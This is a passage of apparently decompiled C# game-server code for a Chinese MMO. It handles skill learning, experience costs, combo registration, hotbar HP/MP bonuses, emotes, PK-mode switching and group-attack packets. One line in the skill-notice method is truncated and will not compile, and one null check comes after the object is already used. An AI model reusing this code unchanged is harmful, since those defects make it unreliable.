						if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 2)
						{
							num4 = 5000;
						}
						else if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 3)
						{
							num4 = 50000;
						}
					}
					else if (武功类.FLD_PID == 1000401)
					{
						if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 1)
						{
							num4 = 200;
						}
						else if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 2)
						{
							num4 = 1000;
						}
					}
					else if (武功类.FLD_PID == 1000109)
					{
						if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 1)
						{
							num4 = 0;
						}
					}
					else if (武功类.FLD_PID == 1000106)
					{
						num4 -= 50;
						if (num4 < 0)
						{
							num4 = 0;
						}
					}
					else if (武功类.FLD_PID == 2030101)
					{
						if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 1)
						{
							num5 = 115;
						}
						else if (武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 == 2)
						{
							num5 = 119;
						}
						num4 = 100000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					else if (武功类.FLD_PID == 2030102)
					{
						num4 = 130000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					else if (武功类.FLD_PID == 2030103)
					{
						num4 = 160000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					else if (武功类.FLD_PID == 2030201)
					{
						num4 = 100000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					else if (武功类.FLD_PID == 2030202)
					{
						num4 = 130000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					else if (武功类.FLD_PID == 2030203)
					{
						num4 = 160000 + 武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
					}
					if (base.Player_Level < num5)
					{
						系统提示("人物等级达到" + num5 + "级,才能修炼。");
						return;
					}
					if (base.Player_ExpErience < num4)
					{
						系统提示("人物历练达到" + 武功类.FLD_NEEDEXP + ",才能修炼。");
						return;
					}
					if (升天武功点数 < num6)
					{
						系统提示("升天武功点数不够,不能修炼。");
						return;
					}
					base.Player_ExpErience -= num4;
					升天武功点数 -= num6;
					int num7 = ++武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX].武功_等级;
				}
				else
				{
					if (武功类.FLD_PID == 2009101)
					{
						for (int i = 0; i < 3; i++)
						{
							武功类 = new 武功类(num2 + i);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 2009104)
					{
						for (int j = 0; j < 4; j++)
						{
							武功类 = new 武功类(num2 + j);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 2009108)
					{
						for (int k = 0; k < 5; k++)
						{
							武功类 = new 武功类(num2 + k);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 6000201)
					{
						for (int l = 0; l < 3; l++)
						{
							武功类 = new 武功类(num2 + l);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 6000202)
					{
						for (int m = 0; m < 4; m++)
						{
							武功类 = new 武功类(num2 + m);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 6000203)
					{
						for (int n = 0; n < 5; n++)
						{
							武功类 = new 武功类(num2 + n);
							武功类.武功_等级 = 1;
							武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
						}
					}
					else if (武功类.FLD_PID == 2000402 && 武功新[0, 23] == null)
					{
						return;
					}
					武功类.武功_等级 = 1;
					武功新[武功类.FLD_武功类型, 武功类.FLD_INDEX] = 武功类;
					base.Player_ExpErience -= value.FLD_NEEDEXP;
				}
				更新经验和历练();
				更新武功和状态();
				学习技能提示();
			}
			else if (num == base.人物灵兽全服ID && World.TBL_KONGFU.TryGetValue(num2, out value2))
			{
				武功类 武功类2 = new 武功类(num2);
				if (base.Player_ExpErience < 武功类2.FLD_NEEDEXP)
				{
					系统提示("历练不够,不能修炼。");
					return;
				}
				人物灵兽.武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
				base.Player_ExpErience -= 武功类2.FLD_NEEDEXP;
				更新灵兽武功和状态();
				学习技能提示();
				更新经验和历练();
			}
		}

		private void 学习神女技能(byte[] data, int length)
		{
			int num = BitConverter.ToInt32(data, 10);
			武功类 value;
			if (World.TBL_KONGFU.TryGetValue(num, out value) && value.FLD_武功类型 == 1)
			{
				try
				{
					if (武功新[1, value.FLD_INDEX] == null)
					{
						武功新[1, value.FLD_INDEX] = new 武功类(num);
					}
					int num2 = (武功新[1, value.FLD_INDEX].武功_等级 == 0) ? 1 : (武功新[1, value.FLD_INDEX].武功_等级 + value.FLD_每级武功点数);
					if (神女武功点数 < num2)
					{
						系统提示("神力点不足，无法学得该武功。");
					}
					else if (武功新[1, value.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
					{
						武功新[1, value.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
					}
					else
					{
						神女武功点数 -= num2;
						int num3 = ++武功新[1, value.FLD_INDEX].武功_等级;
						更新武功和状态();
					}
				}
				catch
				{
				}
			}
		}

		private void 加升天武功点(byte[] data, int length)
		{
			int num = BitConverter.ToInt32(data, 10);
			武功类 value;
			if (World.TBL_KONGFU.TryGetValue(num, out value) && value.FLD_武功类型 == 3)
			{
				try
				{
					if ((value.FLD_ZX == 0 || value.FLD_ZX == base.Player_Zx) && value.FLD_JOB == base.Player_Job && value.FLD_JOBLEVEL <= base.Player_Job_leve && value.FLD_LEVEL <= base.Player_Level)
					{
						if (武功新[3, value.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
						{
							武功新[3, value.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
						}
						else
						{
							if (武功新[3, value.FLD_INDEX] == null)
							{
								武功新[3, value.FLD_INDEX] = new 武功类(num);
							}
							int num2;
							int num3;
							if (武功新[3, value.FLD_INDEX].武功_等级 <= 0)
							{
								num2 = value.FLD_NEEDEXP;
								num3 = 0;
							}
							else
							{
								num2 = value.FLD_NEEDEXP + (武功新[3, value.FLD_INDEX].武功_等级 - 1) * value.FLD_每级加历练;
								num3 = 武功新[3, value.FLD_INDEX].武功_等级 * value.FLD_每级武功点数;
							}
							if (base.Player_ExpErience < num2)
							{
								系统提示("人物历练达到" + num2 + ",才能修炼。");
							}
							else if (升天武功点数 < num3)
							{
								系统提示("升天武功点数不够,不能修炼。");
							}
							else
							{
								base.Player_ExpErience -= num2;
								升天武功点数 -= num3;
								int num4 = ++武功新[3, value.FLD_INDEX].武功_等级;
								if (base.Player_Job == 8)
								{
									if (value.FLD_PID == 1030601)
									{
										if (武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
										{
											num4 = ++武功新[3, 1].武功_等级;
										}
										if (武功新[3, 5] != null && 武功新[3, 5].武功_等级 < 武功新[3, 5].FLD_武功最高级别)
										{
											num4 = ++武功新[3, 5].武功_等级;
										}
										if (武功新[3, 9] != null && 武功新[3, 9].武功_等级 < 武功新[3, 9].FLD_武功最高级别)
										{
											num4 = ++武功新[3, 9].武功_等级;
										}
									}
									else if (value.FLD_PID == 1030301)
									{
										if (武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
										{
											num4 = ++武功新[3, 1].武功_等级;
										}
										if (武功新[3, 5] != null && 武功新[3, 5].武功_等级 < 武功新[3, 5].FLD_武功最高级别)
										{
											num4 = ++武功新[3, 5].武功_等级;
										}
									}
									else if (value.FLD_PID == 1030201 && 武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
									{
										num4 = ++武功新[3, 1].武功_等级;
									}
								}
								更新经验和历练();
								更新武功和状态();
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		public void 学习技能(int FLD_武功类型, int FLD_INDEX)
		{
			武功类 wg = 武功类.GetWg(base.Player_Zx, base.Player_Job, FLD_武功类型, FLD_INDEX);
			if (wg != null)
			{
				武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID);
				base.Player_ExpErience -= wg.FLD_NEEDEXP;
				学习技能提示();
			}
		}

		public void 学习技能2(int FLD_武功类型, int FLD_INDEX)
		{
			武功类 wg = 武功类.GetWg2(this, FLD_武功类型, FLD_INDEX);
			if (wg != null)
			{
				武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID);
				base.Player_ExpErience -= wg.FLD_NEEDEXP;
				学习技能提示();
			}
		}

		public void 学习技能提示()
		{
			byte[] array = Converter.hexStringToByte
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.Player_ExpErience), 0, array, 322, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 技能连击(byte[] data, int length)
		{
			int num = data[14];
			byte[] array = Converter.hexStringToByte("AA555200B801C8004C000100000001000000A9360300853C0300863C0300873C030000000000A9360300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(data, 38, array, 38, 16);
			新武功连击.Clear();
			for (int i = 0; i < num; i++)
			{
				List<武功类> list = new List<武功类>();
				byte[] array2 = new byte[4];
				try
				{
					for (int j = 0; j < 3; j++)
					{
						System.Buffer.BlockCopy(data, j * 4 + 38, array2, 0, 4);
						if (BitConverter.ToInt32(array2, 0) != 0)
						{
							list.Add(new 武功类(BitConverter.ToInt32(array2, 0)));
						}
					}
				}
				catch
				{
				}
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 技能连击2(byte[] data, int length)
		{
			byte[] array = Converter.hexStringToByte("AA555200AF05C3004C00010000000000000000000000853C0300863C0300873C030000000000A9360300AB3603000D37030000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(data, 38, array, 38, 16);
			新武功连击.Clear();
			for (int i = 0; i < 3; i++)
			{
				new List<武功类>();
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, i * 4 + 38, array2, 0, 4);
				新武功连击.Add(new 武功类(BitConverter.ToInt32(array2, 0)));
				系统提示("武功连击登记成功。");
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 放到快捷栏(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA551F002C01181010002CDC143C00000000030002000300000000000000000000000055AA");
			byte[] array2 = new byte[4];
			byte[] array3 = new byte[4];
			byte[] array4 = new byte[4];
			byte[] array5 = new byte[4];
			System.Buffer.BlockCopy(封包数据, 10, array2, 0, 4);
			System.Buffer.BlockCopy(封包数据, 18, array3, 0, 2);
			System.Buffer.BlockCopy(封包数据, 20, array4, 0, 2);
			System.Buffer.BlockCopy(封包数据, 22, array5, 0, 2);
			System.Buffer.BlockCopy(array2, 0, array, 10, 4);
			int itmeid = Converter.getItmeid(Converter.ToString(array2));
			System.Buffer.BlockCopy(BitConverter.GetBytes(itmeid), 0, array, 10, 4);
			if (BitConverter.ToInt32(array4, 0) == 2)
			{
				if (itmeid == 1008000044 && 快捷栏.Contains(1008000044))
				{
					base.人物追加最大_HP -= 300;
					if (base.人物_HP > base.人物最大_HP)
					{
						base.人物_HP = base.人物最大_HP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000045 && 快捷栏.Contains(1008000045))
				{
					base.人物追加最大_MP -= 200;
					if (base.人物_MP > base.人物最大_MP)
					{
						base.人物_MP = base.人物最大_MP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000068 && 快捷栏.Contains(1008000068))
				{
					if (base.人物_HP > base.人物最大_HP)
					{
						base.人物_HP = base.人物最大_HP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000069 && 快捷栏.Contains(1008000069))
				{
					if (base.人物_MP > base.人物最大_MP)
					{
						base.人物_MP = base.人物最大_MP;
					}
					快捷栏.Remove(itmeid);
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 20, 2);
			}
			else
			{
				if (itmeid == 1008000044 && !快捷栏.Contains(1008000044))
				{
					base.人物追加最大_HP += 300;
					快捷栏.Add(1008000044);
				}
				if (itmeid == 1008000045 && !快捷栏.Contains(1008000045))
				{
					base.人物追加最大_MP += 200;
					快捷栏.Add(1008000045);
				}
				if (itmeid == 1008000068 && !快捷栏.Contains(1008000068))
				{
					快捷栏.Add(1008000068);
				}
				if (itmeid == 1008000069 && !快捷栏.Contains(1008000069))
				{
					快捷栏.Add(1008000069);
				}
				System.Buffer.BlockCopy(array3, 0, array, 18, 2);
				System.Buffer.BlockCopy(array4, 0, array, 20, 2);
			}
			System.Buffer.BlockCopy(array5, 0, array, 22, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			更新HP_MP_SP();
		}

		public void 动作表情(byte[] data, int length)
		{
			动作表情(data[10]);
		}

		public void 动作表情(int ID)
		{
			byte[] array = Converter.hexStringToByte("AA550700EE04240001000255AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void PK开关(byte[] data, int length)
		{
			if (base.Player_Level < 35)
			{
				return;
			}
			if (DateTime.Now.Subtract(切换PKtime).TotalSeconds < 2.0)
			{
				switch (base.人物PK模式)
				{
				case 0:
					切换PK模式(0);
					break;
				case 1:
					切换PK模式(1);
					break;
				case 2:
					切换PK模式(2);
					break;
				}
				更新人物数据(this);
				return;
			}
			切换PKtime = DateTime.Now;
			if (base.人物坐标_地图 == 2301)
			{
				if (World.EVEPVP != null && World.Eve90进程 == 3)
				{
					切换PK模式(2);
				}
			}
			else if (base.人物PK模式 == 0)
			{
				切换PK模式(1);
			}
			else if (base.人物PK模式 == 1)
			{
				切换PK模式(2);
			}
			else if (base.人物PK模式 == 2)
			{
				切换PK模式(0);
			}
		}

		public void 发送神女群攻攻击数据(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(NPC全服ID);
					发包类.Write2(武功ID);
					发包类.Write4(群攻击.Count);
					发包类.Write4(武功ID);
					if (Play.Player_Job == 4 && 武功类.FLD_TYPE == 4 && base.弓群攻触发心神)
					{
						发包类.Write4(136);
						base.弓群攻触发心神 = false;
					}
					else
					{
						发包类.Write4(武功类.FLD_EFFERT);
					}
					发包类.Write(Play.人物坐标_X);
					发包类.Write(15f);
					发包类.Write(Play.人物坐标_Y);
					for (int i = 0; i < 10; i++)
					{
						发包类.Write4(0);
						发包类.Write4(0);
					}
					if (Play.Player_Job != 4 && Play.Player_Job != 11)
					{
						发包类.Write2(0);
					}
					else if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[73];
						}
						发包类.Write2(999);
					}
					else
					{
						发包类.Write2(0);
					}
					发包类.Write2(0);
					发包类 发包类2 = new 发包类();
					发包类 发包类3 = new 发包类();
					发包类 发包类4 = new 发包类();
					发包类 发包类5 = new 发包类();
					发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write2(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(1);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write2(0);
					}
					for (int k = 0; k < 20 - 群攻击.Count; k++)
					{
						发包类4.Write8(0L);
					}
					for (int l = 0; l < 20 - 群攻击.Count; l++)
					{
						发包类6.Write4(0);
					}
					for (int m = 0; m < 100 - 群攻击.Count; m++)
					{
						发包类5.Write(0);
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类.Write4(宠物攻击力);
						}
						else
						{
							发包类.Write4(0);
						}
					}
					else
					{
						发包类.Write4(宠物攻击力);
					}
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write2(1);
					发包类.Write2(4);
					发包类.ToArray3();
					if (Play.Client != null)
					{
						Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
					}
					发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送群攻攻击数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送神女群攻攻击数据2(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(NPC全服ID);
					发包类.Write2(武功ID);
					发包类.Write4(群攻击.Count);
					发包类.Write4(武功ID);
					if (Play.Player_Job == 4 && 武功类.FLD_TYPE == 4 && base.弓群攻触发心神)
					{
						发包类.Write4(136);
						base.弓群攻触发心神 = false;
					}
					else
					{
						发包类.Write4(武功类.FLD_EFFERT);
					}
					发包类.Write(Play.人物坐标_X);
					发包类.Write(15f);
					发包类.Write(Play.人物坐标_Y);
					for (int i = 0; i < 10; i++)
					{
						发包类.Write4(0);
						发包类.Write4(0);
					}
					if (Play.Player_Job != 4 && Play.Player_Job != 11)
					{
						发包类.Write2(0);
					}
					else if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[73];
						}
						发包类.Write2(999);
					}
					else
					{
						发包类.Write2(0);
					}
					发包类.Write2(0);
					发包类 发包类2 = new 发包类();
					发包类 发包类3 = new 发包类();
					发包类 发包类4 = new 发包类();
					发包类 发包类5 = new 发包类();
					发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write2(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(1);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write2(0);
					}
					for (int k = 0; k < 20 - 群攻击.Count; k++)
					{
						发包类4.Write8(0L);
					}
					for (int l = 0; l < 20 - 群攻击.Count; l++)
					{
						发包类6.Write4(0);
					}
					for (int m = 0; m < 100 - 群攻击.Count; m++)
					{
						发包类5.Write(0);
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类.Write4(宠物攻击力);
						}
						else
						{
							发包类.Write4(0);
						}
					}
					else
					{
						发包类.Write4(宠物攻击力);
					}
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write2(1);
					发包类.Write2(3);
					发包类.ToArray3();
					if (Play.Client != null)
					{
						Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
					}
					发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送群攻攻击数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送卢群攻攻击数据(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(NPC全服ID);
					发包类.Write2(武功ID);
					发包类.Write4(群攻击.Count);
					发包类.Write4(武功ID);
					if (Play.Player_Job == 4 && 武功类.FLD_TYPE == 4 && base.弓群攻触发心神)
					{
						发包类.Write4(136);
						base.弓群攻触发心神 = false;
					}
					else
					{
						发包类.Write4(武功类.FLD_EFFERT);
					}
					发包类.Write(Play.人物坐标_X);
					发包类.Write(15f);
					发包类.Write(Play.人物坐标_Y);
					for (int i = 0; i < 10; i++)
					{
						发包类.Write4(0);
						发包类.Write4(0);
					}
					if (Play.Player_Job != 4 && Play.Player_Job != 11)
					{
						发包类.Write2(0);
					}
					else if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[73];
						}
						发包类.Write2(999);
					}
					else
					{
						发包类.Write2(0);
					}
					发包类.Write2(0);
					发包类 发包类2 = new 发包类();
					发包类 发包类3 = new 发包类();
					发包类 发包类4 = new 发包类();
					发包类 发包类5 = new 发包类();
					发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write2(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(1);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write2(0);
					}
					for (int k = 0; k < 20 - 群攻击.Count; k++)
					{
						发包类4.Write8(0L);
					}
					for (int l = 0; l < 20 - 群攻击.Count; l++)
					{
						发包类6.Write4(0);
					}
					for (int m = 0; m < 100 - 群攻击.Count; m++)
					{
						发包类5.Write(0);
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类.Write4(宠物攻击力);
						}
						else
						{
							发包类.Write4(0);
						}
					}
					else
					{
						发包类.Write4(宠物攻击力);
					}
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write2(1);
					发包类.Write2(1);
					发包类.ToArray3();
					if (Play.Client != null)
					{
						Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
					}
					发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送群攻攻击数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送卢群攻攻击数据2(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(NPC全服ID);
					发包类.Write2(武功ID);
					发包类.Write4(群攻击.Count);
					发包类.Write4(武功ID);
					if (Play.Player_Job == 4 && 武功类.FLD_TYPE == 4 && base.弓群攻触发心神)
					{
						发包类.Write4(136);
						base.弓群攻触发心神 = false;
					}
					else
					{
						发包类.Write4(武功类.FLD_EFFERT);
					}
					发包类.Write(Play.人物坐标_X);
					发包类.Write(15f);
					发包类.Write(Play.人物坐标_Y);
					for (int i = 0; i < 10; i++)
					{
						发包类.Write4(0);
						发包类.Write4(0);
					}
					if (Play.Player_Job != 4 && Play.Player_Job != 11)
					{
						发包类.Write2(0);
					}
					else if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[73];
						}
						发包类.Write2(999);
					}
					else
					{
						发包类.Write2(0);
					}
					发包类.Write2(0);
					发包类 发包类2 = new 发包类();
					发包类 发包类3 = new 发包类();
					发包类 发包类4 = new 发包类();
					发包类 发包类5 = new 发包类();
					发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write2(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(1);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write2(0);
					}
					for (int k = 0; k < 20 - 群攻击.Count; k++)
					{
						发包类4.Write8(0L);
					}
					for (int l = 0; l < 20 - 群攻击.Count; l++)
					{
						发包类6.Write4(0);
					}
					for (int m = 0; m < 100 - 群攻击.Count; m++)
					{
						发包类5.Write(0);
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类.Write4(宠物攻击力);
						}
						else
						{
							发包类.Write4(0);
						}
					}
					else
					{
						发包类.Write4(宠物攻击力);
					}
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write2(1);
					发包类.Write2(2);
					发包类.ToArray3();
					if (Play.Client != null)
					{
						Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
					}
					发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送群攻攻击数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送群攻攻击数据2(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(NPC全服ID);
					发包类.Write2(武功ID);
					发包类.Write4(群攻击.Count);
					发包类.Write4(武功ID);
					if (Play.Player_Job == 4 && 武功类.FLD_TYPE == 4 && base.弓群攻触发心神)
					{
						发包类.Write4(136);
						base.弓群攻触发心神 = false;
					}
					else
					{
						发包类.Write4(武功类.FLD_EFFERT);
					}
					发包类.Write(Play.人物坐标_X);
					发包类.Write(15f);
					发包类.Write(Play.人物坐标_Y);
					for (int i = 0; i < 10; i++)
					{
